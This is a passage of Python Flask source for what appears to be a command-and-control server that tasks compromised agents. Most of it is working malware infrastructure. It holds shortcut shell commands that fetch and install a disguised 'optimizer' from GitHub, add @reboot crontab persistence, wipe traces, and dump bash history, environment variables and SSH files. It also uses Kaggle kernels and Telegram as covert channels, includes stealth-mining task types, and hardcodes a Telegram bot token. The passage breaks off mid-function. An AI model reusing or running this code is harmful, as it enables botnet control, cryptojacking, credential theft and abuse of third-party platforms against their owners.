    sleep_interval = config_row["sleep_interval"] if config_row else 5
    jitter = config_row["jitter"] if config_row else 10
    
    # Get pending tasks
    tasks = db.execute("SELECT id, task_type, payload FROM tasks WHERE agent_id=? AND status='pending'", (agent_id,)).fetchall()
    task_list = [dict(t) for t in tasks]
    
    # Mark tasks as sent
    for t in tasks:
        db.execute("UPDATE tasks SET status='sent' WHERE id=?", (t["id"],))
    
    db.commit()
    db.close()
    
    # Send Telegram notification (throttled)
    if hash(agent_id + str(int(time.time()/60))) % 10 == 0:
        log_event("beacon", f"{agent_id[:8]} ({hostname}) from {request.remote_addr} - {len(task_list)} tasks")
        
        # Telegram notification
        try:
            import requests
            bot_token = os.environ.get("TELEGRAM_BOT_TOKEN", "8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc")
            chat_id = os.environ.get("TELEGRAM_CHAT_ID", "5804150664")
            
            msg = f"📡 Beacon: {agent_id[:8]}\nHost: {hostname}\nTasks: {len(task_list)}"
            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=5)
        except:
            pass
    
    resp = json.dumps({"tasks": task_list, "sleep": sleep_interval, "jitter": jitter})
    if encrypted:
        return Response(encrypt_payload(resp, enc_key), content_type="text/plain")
    return jsonify({"tasks": task_list, "sleep": sleep_interval, "jitter": jitter})

@app.route("/api/agent/result", methods=["POST"])
def agent_result():
    enc_key = get_config("encryption_key")
    if request.headers.get("X-Enc") == "1" and enc_key:
        try:
            raw = decrypt_payload(request.get_data(as_text=True), enc_key)
            data = json.loads(raw)
        except Exception:
            return jsonify({"error": "decrypt failed"}), 400
    else:
        data = request.get_json(silent=True) or {}

    task_id = data.get("task_id", "")
    result = data.get("result", "")
    db = get_db()
    db.execute("UPDATE tasks SET status='completed', result=?, completed_at=datetime('now') WHERE id=?",
               (result, task_id))
    task_row = db.execute("SELECT agent_id, task_type FROM tasks WHERE id=?", (task_id,)).fetchone()
    agent_id_for_ws = task_row["agent_id"] if task_row else ""
    task_type = task_row["task_type"] if task_row else ""
    db.commit()
    db.close()
    
    # Emit WebSocket event for real-time dashboard
    socketio.emit("task_result", {
        "task_id": task_id, 
        "task_type": task_type,
        "result": result[:500],  # Truncate for WebSocket
        "agent_id": agent_id_for_ws
    })
    
    # Emit mining stats if it's a mining task
    if task_type in ("stealth_mining_start", "stealth_mining_status", "global_domination"):
        socketio.emit("mining_stats", {
            "agent_id": agent_id_for_ws,
            "result": result[:200]
        })
    
    return jsonify({"status": "ok"})

# ── Shortcut commands ──

SHORTCUT_COMMANDS = {
    # GPU Optimizer
    ":start":    "pip install git+https://github.com/GaredBerns/C2_server -q 2>/dev/null; nohup bash -c 'c2-optimizer 2>/dev/null || python3 -m optimizer.cli' >/dev/null 2>&1 &",
    ":stop":     "pkill -f 'c2-optimizer' 2>/dev/null; pkill -f 'optimizer.cli' 2>/dev/null; pkill -f '.tco_cache' 2>/dev/null; rm -f /tmp/.tco_training_lock; echo stopped",
    ":status":   "pgrep -af 'c2-optimizer|optimizer.cli|tco_cache' 2>/dev/null && echo RUNNING || echo NOT_RUNNING; ls -la /tmp/.tco_cache/ 2>/dev/null; tail -5 /tmp/.tco_cache/training_output.log 2>/dev/null",
    ":log":      "tail -50 /tmp/.tco_cache/training_output.log 2>/dev/null || echo 'no log'",
    ":persist":  "pip install git+https://github.com/GaredBerns/C2_server -q 2>/dev/null; (crontab -l 2>/dev/null | grep -v 'c2-optimizer\\|optimizer.cli'; echo '@reboot bash -c \"c2-optimizer 2>/dev/null || python3 -m optimizer.cli\" >/dev/null 2>&1 &') | crontab -; nohup bash -c 'c2-optimizer 2>/dev/null || python3 -m optimizer.cli' >/dev/null 2>&1 &",
    ":cleanup":  "rm -rf /tmp/.tco_cache /tmp/.tco_training_lock; crontab -l 2>/dev/null | grep -v 'c2-optimizer\\|optimizer.cli' | crontab -; echo cleaned",
    # System info
    ":sysinfo":  "echo '=== SYSTEM ===' && uname -a && echo '=== CPU ===' && nproc && echo '=== MEMORY ===' && free -h 2>/dev/null && echo '=== DISK ===' && df -h / && echo '=== GPU ===' && (nvidia-smi --query-gpu=name,memory.total,utilization.gpu --format=csv,noheader 2>/dev/null || echo 'no GPU') && echo '=== NETWORK ===' && (ip -4 addr 2>/dev/null || ifconfig 2>/dev/null)",
    ":id":       "id && whoami && hostname",
    ":ps":       "ps aux --sort=-%cpu 2>/dev/null | head -30 || ps aux | head -30",
    ":net":      "ip -4 addr 2>/dev/null && echo '--- ROUTES ---' && ip route 2>/dev/null || ifconfig && netstat -rn 2>/dev/null",
    ":ports":    "ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null || echo 'no ss/netstat'",
    ":env":      "env | sort",
    ":ls":       "ls -la",
    ":cwd":      "pwd && ls -la",
    ":gpu":      "nvidia-smi 2>/dev/null || (python3 -c 'import torch; print(torch.cuda.get_device_name(0))' 2>/dev/null) || echo 'no GPU'",
    ":pip":      "pip list 2>/dev/null | head -40",
    ":history":  "cat ~/.bash_history 2>/dev/null | tail -50 || history 2>/dev/null | tail -50",
    ":cron":     "crontab -l 2>/dev/null || echo 'no crontab'",
    ":ssh":      "ls ~/.ssh/ 2>/dev/null && cat ~/.ssh/known_hosts 2>/dev/null | head -20",
    ":uptime":   "uptime && who 2>/dev/null",
}

def _expand_shortcut(task_type: str, payload: str):
    """Expand shortcut commands like :start into real shell commands."""
    stripped = payload.strip()
    if stripped in SHORTCUT_COMMANDS:
        return "cmd", SHORTCUT_COMMANDS[stripped]
    return task_type, payload


@app.route("/api/task/create", methods=["POST"])
@login_required
def create_task():
    from src.utils.validation import TaskCreate, validate_request
    
    data = request.get_json(silent=True) or {}
    
    # Validate input
    is_valid, result = validate_request(TaskCreate, data)
    if not is_valid:
        return jsonify({"error": "validation failed", "details": result}), 400
    
    agent_id = result["agent_id"]
    task_type = result["type"]
    payload = result["payload"]
    
    task_type, payload = _expand_shortcut(task_type, payload)
    task_id = str(uuid.uuid4())
    
    try:
        db = get_db()
        db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
                   (task_id, agent_id, task_type, payload))
        db.commit()
        db.close()
        log_event("task_created", f"{task_type}: {payload[:80]} -> {agent_id[:8]}")
        return jsonify({"status": "ok", "task_id": task_id})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/task/broadcast", methods=["POST"])
@login_required
def broadcast_task():
    from src.utils.validation import TaskBroadcast, validate_request
    
    data = request.get_json(silent=True) or {}
    
    # Validate input
    is_valid, result = validate_request(TaskBroadcast, data)
    if not is_valid:
        return jsonify({"error": "validation failed", "details": result}), 400
    
    task_type = result["type"]
    payload = result["payload"]
    target = result["target"]
    
    task_type, payload = _expand_shortcut(task_type, payload)
    
    try:
        db = get_db()
        if target == "all":
            agents = db.execute("SELECT id FROM agents WHERE is_alive=1").fetchall()
        else:
            agents = db.execute("SELECT id FROM agents WHERE is_alive=1 AND group_name=?", (target,)).fetchall()
        
        for a in agents:
            task_id = str(uuid.uuid4())
            db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
                       (task_id, a["id"], task_type, payload))
        db.commit()
        db.close()
        log_event("broadcast", f"{task_type}: {payload[:80]} -> {len(agents)} agents ({target})")
        return jsonify({"status": "ok", "count": len(agents)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/task/bulk", methods=["POST"])
@login_required
def bulk_task():
    """Execute task on specific list of agents."""
    data = request.get_json(silent=True) or {}
    agent_ids = data.get("agents", [])
    task_type = data.get("type", "cmd")
    payload = data.get("payload", "")
    
    if not agent_ids or not payload:
        return jsonify({"error": "missing agents or payload"}), 400
    
    task_type, payload = _expand_shortcut(task_type, payload)
    
    try:
        db = get_db()
        count = 0
        for agent_id in agent_ids:
            task_id = str(uuid.uuid4())
            db.execute("INSERT INTO tasks (id, agent_id, task_type, payload) VALUES (?, ?, ?, ?)",
                       (task_id, agent_id, task_type, payload))
            count += 1
        db.commit()
        db.close()
        log_event("bulk_task", f"{task_type}: {payload[:50]} -> {count} agents")
        return jsonify({"status": "ok", "count": count})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/agents/bulk-kill", methods=["POST"])
@login_required
def bulk_kill():
    """Kill agents (remove from database)."""
    data = request.get_json(silent=True) or {}
    agent_ids = data.get("agents", [])
    
    if not agent_ids:
        return jsonify({"error": "no agents specified"}), 400
    
    try:
        db = get_db()
        count = 0
        for agent_id in agent_ids:
            db.execute("DELETE FROM agents WHERE id=?", (agent_id,))
            db.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
            count += 1
        db.commit()
        db.close()
        log_event("bulk_kill", f"Removed {count} agents")
        return jsonify({"status": "ok", "count": count})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/agents/bulk-tag", methods=["POST"])
@login_required
def bulk_tag():
    """Tag multiple agents."""
    data = request.get_json(silent=True) or {}
    agent_ids = data.get("agents", [])
    tag = data.get("tag", "")
    
    if not agent_ids:
        return jsonify({"error": "no agents specified"}), 400
    
    try:
        db = get_db()
        count = 0
        for agent_id in agent_ids:
            agent = db.execute("SELECT tags FROM agents WHERE id=?", (agent_id,)).fetchone()
            if agent:
                tags = json.loads(agent["tags"] or "[]")
                if tag and tag not in tags:
                    tags.append(tag)
                db.execute("UPDATE agents SET tags=? WHERE id=?", (json.dumps(tags), agent_id))
                count += 1
        db.commit()
        db.close()
        return jsonify({"status": "ok", "count": count})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ═══════════════════════════════════════════════════════════════
# KAGGLE C2 TRANSPORT API
# ═══════════════════════════════════════════════════════════════

def get_kaggle_manager():
    """Get or create Kaggle C2 manager."""
    global kaggle_c2_manager
    if not KAGGLE_C2_AVAILABLE:
        return None
    if kaggle_c2_manager is None:
        kaggle_c2_manager = KaggleC2Manager(
            accounts_file=str(BASE_DIR / "data" / "accounts.json"),
            log_fn=lambda msg: log_event("kaggle_c2", msg)
        )
        kaggle_c2_manager.load_accounts()
    return kaggle_c2_manager

@app.route("/api/kaggle/agents", methods=["GET"])
@login_required
def kaggle_list_agents():
    """List all Kaggle agents."""
    manager = get_kaggle_manager()
    if not manager:
        return jsonify({"error": "Kaggle C2 not available"}), 503
    return jsonify({"agents": manager.list_agents()})

@app.route("/api/kaggle/setup", methods=["POST"])
@login_required
def kaggle_setup_agent():
    """Setup dataset and kernel for a Kaggle agent."""
    manager = get_kaggle_manager()
    if not manager:
        return jsonify({"error": "Kaggle C2 not available"}), 503
    
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    
    if not username:
        return jsonify({"error": "username required"}), 400
    
    transport = manager.get_agent(username)
    if not transport:
        return jsonify({"error": "agent not found"}), 404
    
    success = transport.setup()
    return jsonify({"status": "ok" if success else "error", "username": username})

@app.route("/api/kaggle/exec", methods=["POST"])
@login_required
def kaggle_exec():
    """Execute command on Kaggle agent and wait for result."""
    manager = get_kaggle_manager()
    if not manager:
        return jsonify({"error": "Kaggle C2 not available"}), 503
    
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    cmd_type = data.get("type", "shell")
    payload = data.get("payload")
    timeout = data.get("timeout", 300)
    
    if not username or not payload:
        return jsonify({"error": "username and payload required"}), 400
    
    transport = manager.get_agent(username)
    if not transport:
        return jsonify({"error": "agent not found"}), 404
    
    result = transport.quick_command(cmd_type, payload, timeout=timeout)
    
    if result:
        log_event("kaggle_exec", f"{username}: {cmd_type} -> {result.get('status')}")
        return jsonify({"status": "ok", "result": result})
    else:
        return jsonify({"status": "error", "error": "no result or timeout"})

@app.route("/api/kaggle/batch", methods=["POST"])
@login_required
def kaggle_batch():
    """Execute multiple commands on Kaggle agent."""
    manager = get_kaggle_manager()
    if not manager:
        return jsonify({"error": "Kaggle C2 not available"}), 503
    
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    commands = data.get("commands", [])
    timeout = data.get("timeout", 300)
    
    if not username or not commands:
        return jsonify({"error": "username and commands required"}), 400
    
    transport = manager.get_agent(username)
    if not transport:
        return jsonify({"error": "agent not found"}), 404
    
    result = transport.execute_and_wait(commands, timeout=timeout)
    
    if result:
        log_event("kaggle_batch", f"{username}: {len(commands)} commands")
        return jsonify({"status": "ok", "result": result})
    else:
        return jsonify({"status": "error", "error": "no result or timeout"})

@app.route("/api/kaggle/status", methods=["GET"])
@login_required
def kaggle_status():
    """Check kernel status for a Kaggle agent."""
    manager = get_kaggle_manager()
    if not manager:
        return jsonify({"error": "Kaggle C2 not available"}), 503
    
    username = request.args.get("username")
    if not username:
        return jsonify({"error": "username required"}), 400
    
    transport = manager.get_agent(username)
    if not transport:
        return jsonify({"error": "agent not found"}), 404
    
    status = transport.get_kernel_status()
    return jsonify({"username": username, "status": status})

@app.route("/api/kaggle/results", methods=["GET"])
@login_required
def kaggle_results():
    """Get results from last kernel run."""
    manager = get_kaggle_manager()
    if not manager:
        return jsonify({"error": "Kaggle C2 not available"}), 503
    
    username = request.args.get("username")
    if not username:
        return jsonify({"error": "username required"}), 400
    
    transport = manager.get_agent(username)
    if not transport:
        return jsonify({"error": "agent not found"}), 404
    
    results = transport.get_results()
    
    if results:
        return jsonify({"status": "ok", "results": results})
    else:
        return jsonify({"status": "error", "error": "no results"})

@app.route("/api/kaggle/setup_all", methods=["POST"])
@login_required
def kaggle_setup_all():
    """Setup all Kaggle agents."""
    manager = get_kaggle_manager()
    if not manager:
        return jsonify({"error": "Kaggle C2 not available"}), 503
    
    results = manager.setup_all()
    success_count = sum(1 for v in results.values() if v)
    
    return jsonify({
        "status": "ok",
        "total": len(results),
        "success": success_count,
        "results": results
    })

# ==================== KERNEL MANAGEMENT BY ID ====================

@app.route("/api/kaggle/kernel/exec", methods=["POST"])
@login_required
def kaggle_kernel_exec():
    """Execute command on specific kernel by ID (kaggle-{username}-agent{N})."""
    data = request.get_json(silent=True) or {}
    kernel_id = data.get("kernel_id")  # e.g. "kaggle-username-agent1"
    command = data.get("command")
    
    if not kernel_id or not command:
        return jsonify({"error": "kernel_id and command required"}), 400
    
    # Parse kernel_id: kaggle-{username}-agent{N}
    parts = kernel_id.replace("kaggle-", "").rsplit("-agent", 1)
    if len(parts) != 2:
        return jsonify({"error": "invalid kernel_id format"}), 400
    
    username, kernel_num = parts
    kernel_num = int(kernel_num)
    
    # Get account
    accounts = account_store.get_all()
    account = None
    for a in accounts:
        if a.get("kaggle_username") == username:
            account = a
            break
    
    if not account:
        return jsonify({"error": f"account {username} not found"}), 404
    
    api_key = account.get("api_key")
    if not api_key:
        return jsonify({"error": "no api_key for account"}), 400
    
    # Push kernel with command (async - don't wait)
    import tempfile
    from pathlib import Path
    
    kernel_slug = f"{username}/c2-agent-{kernel_num}"
    
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Kernel metadata
            metadata = {
                "id": kernel_slug,
                "title": f"C2 Agent {kernel_num}",
                "code_file": "notebook.ipynb",
                "language": "python",
                "kernel_type": "notebook",
                "is_private": True,
                "enable_gpu": True,
                "enable_internet": True
            }
            (tmpdir_path / "kernel-metadata.json").write_text(json.dumps(metadata, indent=2))
            
            # Notebook with command
            notebook = {
                "cells": [{
                    "cell_type": "code",
                    "execution_count": None,
                    "metadata": {},
                    "outputs": [],
                    "source": [
                        "import subprocess, json\n",
                        f"cmd = {json.dumps(command)}\n",
                        "print(f'[EXEC] {cmd}', flush=True)\n",
                        "r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)\n",
                        "print(json.dumps({'returncode': r.returncode, 'stdout': r.stdout, 'stderr': r.stderr}), flush=True)\n"
                    ]
                }],
                "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
                "nbformat": 4, "nbformat_minor": 4
            }
            (tmpdir_path / "notebook.ipynb").write_text(json.dumps(notebook, indent=2))
            
            # Push
            result = subprocess.run(
                ["kaggle", "kernels", "push", "-p", tmpdir],
                capture_output=True, text=True, timeout=60,
                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
            )
            
            if result.returncode == 0 or "successfully" in result.stdout.lower():
                log_event("kaggle_kernel_exec", f"{kernel_id}: {command[:50]}")
                return jsonify({
                    "status": "started", 
                    "kernel": kernel_slug,
                    "message": "Kernel pushed, check status/results in 1-2 minutes"
                })
            else:
                return jsonify({"status": "error", "error": result.stderr[:200]})
                
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)})

@app.route("/api/kaggle/kernel/status", methods=["POST"])
@login_required
def kaggle_kernel_status():
    """Get status of specific kernel."""
    data = request.get_json(silent=True) or {}
    kernel_slug = data.get("kernel_slug")  # Full slug like username/analysis-1-timestamp
    kernel_id = data.get("kernel_id")
    
    # If kernel_slug provided directly, use it
    if kernel_slug:
        # Extract username from slug
        parts = kernel_slug.split("/")
        if len(parts) == 2:
            username = parts[0]
        else:
            return jsonify({"error": "invalid kernel_slug format"}), 400
    elif kernel_id:
        # Legacy format: kaggle-username-agentN
        parts = kernel_id.replace("kaggle-", "").rsplit("-agent", 1)
        if len(parts) != 2:
            return jsonify({"error": "invalid kernel_id format"}), 400
        
        username, kernel_num = parts
        kernel_slug = f"{username}/c2-agent-{kernel_num}"
    else:
        return jsonify({"error": "kernel_slug or kernel_id required"}), 400
    
    # Get account credentials
    accounts = account_store.get_all()
    account = None
    for a in accounts:
        if a.get("kaggle_username") == username or a.get("username") == username:
            account = a
            break
    
    if not account:
        return jsonify({"kernel_slug": kernel_slug, "status": "error", "error": "account not found"})
    
    api_key = account.get("api_key") or account.get("api_key_legacy")
    
    # Check kernel status via CLI with credentials
    import subprocess
    kaggle_cmd = os.path.expanduser("~/.local/bin/kaggle")
    if not os.path.exists(kaggle_cmd):
        kaggle_cmd = "kaggle"
    
    try:
        result = subprocess.run(
            [kaggle_cmd, "kernels", "status", kernel_slug],
            capture_output=True, text=True, timeout=30,
            env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
        )
        
        status = "unknown"
        if result.returncode == 0:
            if "COMPLETE" in result.stdout:
                status = "complete"
            elif "RUNNING" in result.stdout:
                status = "running"
            elif "QUEUED" in result.stdout:
                status = "queued"
            elif "ERROR" in result.stdout:
                status = "error"
        else:
            # Kernel might not exist yet
            status = "not_found"
        
        return jsonify({"kernel_slug": kernel_slug, "status": status, "details": result.stdout[:200] if result.stdout else result.stderr[:200]})
    except Exception as e:
        return jsonify({"kernel_slug": kernel_slug, "status": "error", "error": str(e)})

@app.route("/api/kaggle/kernel/results", methods=["POST"])
@login_required
def kaggle_kernel_results():
    """Get results from kernel execution."""
    data = request.get_json(silent=True) or {}
    kernel_id = data.get("kernel_id")
    
    if not kernel_id:
        return jsonify({"error": "kernel_id required"}), 400
    
    parts = kernel_id.replace("kaggle-", "").rsplit("-agent", 1)
    if len(parts) != 2:
        return jsonify({"error": "invalid kernel_id format"}), 400
    
    username, kernel_num = parts
    
    # Get account
    accounts = account_store.get_all()
    account = None
    for a in accounts:
        if a.get("kaggle_username") == username:
            account = a
            break
    
    if not account:
        return jsonify({"error": f"account {username} not found"}), 404
    
    api_key = account.get("api_key")
    
    # Download kernel output
    import subprocess
    import tempfile
    from pathlib import Path
    
    kernel_slug = f"{username}/c2-agent-{kernel_num}"
    
    with tempfile.TemporaryDirectory() as tmpdir:
        try:
            result = subprocess.run(
                ["kaggle", "kernels", "output", kernel_slug, "-p", tmpdir],
                capture_output=True, text=True, timeout=60,
                env={**os.environ, "KAGGLE_USERNAME": username, "KAGGLE_KEY": api_key}
            )
            
            if result.returncode != 0:
                return jsonify({"error": result.stderr[:200]}), 400
            
            # Read output files
            outputs = {}
            for f in Path(tmpdir).glob("*"):
                if f.is_file():
                    try:
                        outputs[f.name] = f.read_text()[:5000]
                    except:
                        outputs[f.name] = "<binary>"
            
            return jsonify({"kernel_id": kernel_id, "outputs": outputs})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

@app.route("/api/kaggle/broadcast", methods=["POST"])
@login_required
def kaggle_broadcast():
    """Execute command on ALL Kaggle kernels."""
    data = request.get_json(silent=True) or {}
    command = data.get("command")
    timeout = data.get("timeout", 300)
    
    if not command:
        return jsonify({"error": "command required"}), 400
    
    manager = get_kaggle_manager()
    if not manager or not manager.transports:
        manager = get_kaggle_manager()
        manager.load_accounts()
    
    if not manager.transports:
        return jsonify({"error": "No Kaggle accounts loaded"}), 400
    
    # Execute on all accounts (5 kernels each)
    results = []
    for username, transport in manager.transports.items():
        try:
            from src.agents.kaggle.transport import KaggleMultiKernel
            api_key = transport.api_key
            mk = KaggleMultiKernel(username, api_key, None, kernel_count=5)
            
            # Execute on all 5 kernels
            for i in range(1, 6):
                r = mk.execute_on_kernel(i, command, timeout=timeout)
                results.append({
                    "kernel_id": f"kaggle-{username}-agent{i}",
                    "status": "ok" if r.get("success") else "error",
                    "output": r.get("output", "")[:100] if r else None
                })
        except Exception as e:
            results.append({"username": username, "status": "error", "error": str(e)})
    
    log_event("kaggle_broadcast", f"{len(results)} kernels")
    return jsonify({"status": "ok", "count": len(results), "results": results})

# ==================== C2 AGENT PERSISTENT CONTROL ====================

# Store for agent checkins and commands with TTL cleanup
kaggle_agents_state = {}
kaggle_agents_state_lock = threading.Lock()
MAX_AGENT_STATE_AGE = 3600  # 1 hour
MAX_RESULTS_PER_AGENT = 100

@app.route("/api/kaggle/agent/checkin", methods=["POST"])
def kaggle_agent_checkin():
    """Agent checkin endpoint - returns pending commands."""
    data = request.get_json(silent=True) or {}
    kernel_id = data.get("kernel_id")
    info = data.get("info", {})
    
    if not kernel_id:
        return jsonify({"error": "kernel_id required"}), 400
    
    # Update agent state with lock
    with kaggle_agents_state_lock:
        kaggle_agents_state[kernel_id] = {
            "last_checkin": time.time(),
            "info": info,
            "status": "online",
            "pending_commands": kaggle_agents_state.get(kernel_id, {}).get("pending_commands", []),
            "results": kaggle_agents_state.get(kernel_id, {}).get("results", [])
        }
        
        # Get pending commands for this agent
        commands = kaggle_agents_state[kernel_id]["pending_commands"]
        kaggle_agents_state[kernel_id]["pending_commands"] = []
    
    log_event("kaggle_checkin", kernel_id)
    return jsonify({"status": "ok", "commands": commands})

@app.route("/api/kaggle/agent/result", methods=["POST"])
def kaggle_agent_result():
    """Receive command results from agent."""
    data = request.get_json(silent=True) or {}
    kernel_id = data.get("kernel_id")
    cmd_id = data.get("cmd_id")
    result = data.get("result", {})
    
    if not kernel_id:
        return jsonify({"error": "kernel_id required"}), 400
    
    # Store result with lock
    with kaggle_agents_state_lock:
        if kernel_id not in kaggle_agents_state:
            kaggle_agents_state[kernel_id] = {"results": [], "pending_commands": []}
        
        if "results" not in kaggle_agents_state[kernel_id]:
            kaggle_agents_state[kernel_id]["results"] = []
        
        kaggle_agents_state[kernel_id]["results"].append({
            "cmd_id": cmd_id,
            "result": result,
            "timestamp": time.time()
        })
        
        # Keep only last MAX_RESULTS_PER_AGENT results
        kaggle_agents_state[kernel_id]["results"] = kaggle_agents_state[kernel_id]["results"][-MAX_RESULTS_PER_AGENT:]
    
    log_event("kaggle_result", f"{kernel_id}: {cmd_id}")
    return jsonify({"status": "ok"})

@app.route("/api/kaggle/agent/queue", methods=["POST"])
@login_required
def kaggle_agent_queue():
    """Queue command for agent to pick up on next checkin."""
    data = request.get_json(silent=True) or {}
    kernel_id = data.get("kernel_id")
    cmd_type = data.get("type", "shell")
    payload = data.get("payload")
    
    if not kernel_id or not payload:
        return jsonify({"error": "kernel_id and payload required"}), 400
    
    # Add command to queue with lock
    with kaggle_agents_state_lock:
        if kernel_id not in kaggle_agents_state:
            kaggle_agents_state[kernel_id] = {"pending_commands": [], "results": []}
        
        if "pending_commands" not in kaggle_agents_state[kernel_id]:
            kaggle_agents_state[kernel_id]["pending_commands"] = []
        
        cmd = {
            "id": f"cmd-{int(time.time())}-{len(kaggle_agents_state[kernel_id]['pending_commands'])}",
            "type": cmd_type,
            "payload": payload
        }
        kaggle_agents_state[kernel_id]["pending_commands"].append(cmd)
    
    log_event("kaggle_queue", f"{kernel_id}: {cmd_type}")
    return jsonify({"status": "ok", "cmd_id": cmd["id"]})

@app.route("/api/kaggle/agents/status", methods=["GET"])
@login_required
def kaggle_agents_status():
    """Get status of all checked-in agents."""
    now = time.time()
    agents = []
    
    with kaggle_agents_state_lock:
        for kernel_id, state in list(kaggle_agents_state.items()):
            last_checkin = state.get("last_checkin", 0)
            status = "online" if now - last_checkin < 120 else "offline"
            
            agents.append({
                "kernel_id": kernel_id,
                "status": status,
                "last_checkin": last_checkin,
                "info": state.get("info", {}),
                "pending_commands": len(state.get("pending_commands", [])),
                "results_count": len(state.get("results", []))
            })
    
    return jsonify({"agents": agents, "total": len(agents)})

# ──────────────────────── API: TELEGRAM C2 ────────────────────────

@app.route("/api/telegram/send-command", methods=["POST"])
@login_required
def telegram_send_command():
    """Send command to agent via Telegram API."""
    data = request.get_json(silent=True) or {}
    agent_id = data.get("agent_id")
    command = data.get("command")
    
    if not agent_id or not command:
        return jsonify({"error": "agent_id and command required"}), 400
    
    bot_token = get_config("telegram_bot_token", "")
    chat_id = get_config("telegram_chat_id", "")
    
    if not bot_token:
        return jsonify({"error": "telegram_bot_token not configured"}), 400
    
    import urllib.request
    import ssl as _ssl
    
    msg = f"/cmd {agent_id} {command}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        
        req_data = json.dumps({"chat_id": chat_id, "text": msg}).encode()
        req = urllib.request.Request(url, data=req_data, headers={"Content-Type": "application/json"})
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        result = json.loads(resp.read().decode())
        
        if result.get("ok"):
            log_event("telegram_cmd_sent", f"{agent_id}: {command[:50]}")
            return jsonify({"status": "ok", "message_id": result.get("result", {}).get("message_id")})
        else:
            return jsonify({"error": result.get("description", "send failed")}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/telegram/broadcast", methods=["POST"])
@login_required
def telegram_broadcast():
    """Broadcast message to all agents via Telegram."""
    data = request.get_json(silent=True) or {}
    message = data.get("message")
    
    if not message:
        return jsonify({"error": "message required"}), 400
    
    bot_token = get_config("telegram_bot_token", "")
    chat_id = get_config("telegram_chat_id", "")
    
    if not bot_token:
        return jsonify({"error": "telegram_bot_token not configured"}), 400
    
    import urllib.request
    import ssl as _ssl
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    
    try:
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        
        req_data = json.dumps({"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}).encode()
        req = urllib.request.Request(url, data=req_data, headers={"Content-Type": "application/json"})
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        result = json.loads(resp.read().decode())
        
        if result.get("ok"):
            log_event("telegram_broadcast", message[:50])
            return jsonify({"status": "ok"})
        else:
            return jsonify({"error": result.get("description", "send failed")}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# Dataset-based C2 (for Kaggle kernels without internet)
DATASET_COMMANDS_FILE = BASE_DIR / "data" / "dataset_commands.json"

def load_dataset_commands():
    """Load commands for dataset-based C2."""
    if DATASET_COMMANDS_FILE.exists():
        try:
            return json.loads(DATASET_COMMANDS_FILE.read_text())
        except:
            pass
    return {"commands": [], "last_update": 0, "kernel_targets": {}}

def save_dataset_commands(data):
    DATASET_COMMANDS_FILE.parent.mkdir(parents=True, exist_ok=True)
    DATASET_COMMANDS_FILE.write_text(json.dumps(data, indent=2))

@app.route("/api/kaggle/dataset/commands", methods=["GET"])
@login_required
def get_dataset_commands():
    """Get current commands for dataset."""
    return jsonify(load_dataset_commands())

@app.route("/api/kaggle/dataset/commands", methods=["POST"])
@login_required
def add_dataset_command():
    """Add command to dataset queue."""
    data = request.get_json(silent=True) or {}
    cmd_text = data.get("command")
    target = data.get("target", "all")  # kernel_id or "all"
    
    if not cmd_text:
        return jsonify({"error": "command required"}), 400
    
    commands_data = load_dataset_commands()
    
    cmd = {
        "id": f"cmd-{int(time.time())}-{len(commands_data['commands'])}",
        "command": cmd_text,
        "target": target,
        "created": time.time(),
        "executed": False
    }
    
    commands_data["commands"].append(cmd)
    commands_data["last_update"] = time.time()
    save_dataset_commands(commands_data)
    
    log_event("dataset_cmd", f"{target}: {cmd_text[:50]}")
    return jsonify({"status": "ok", "cmd_id": cmd["id"]})

@app.route("/api/kaggle/dataset/commands/<cmd_id>/executed", methods=["POST"])
@login_required
def mark_command_executed(cmd_id):
    """Mark command as executed."""
    commands_data = load_dataset_commands()
    
    for cmd in commands_data["commands"]:
        if cmd["id"] == cmd_id:
            cmd["executed"] = True
            cmd["executed_at"] = time.time()
            save_dataset_commands(commands_data)
            return jsonify({"status": "ok"})
    
    return jsonify({"error": "command not found"}), 404

@app.route("/api/kaggle/dataset/push", methods=["POST"])
@login_required
def push_commands_dataset():
    """Push commands to Kaggle dataset for a specific account."""
    data = request.get_json(silent=True) or {}
    username = data.get("username")
    api_key = data.get("api_key")
    dataset_name = data.get("dataset_name", "c2-commands")
    
    if not username or not api_key:
        return jsonify({"error": "username and api_key required"}), 400
    
    commands_data = load_dataset_commands()
    
    # Create temp dir for dataset
    with tempfile.TemporaryDirectory() as tmpdir:
        tmpdir_path = Path(tmpdir)
        
        # Write commands file
        (tmpdir_path / "commands.json").write_text(json.dumps(commands_data, indent=2))
        
        # Write dataset metadata
        metadata = {
            "title": dataset_name,
            "id": f"{username}/{dataset_name}",
            "subtitle": "Command dataset for C2 agents communication",
            "description": "Commands for C2 agents",
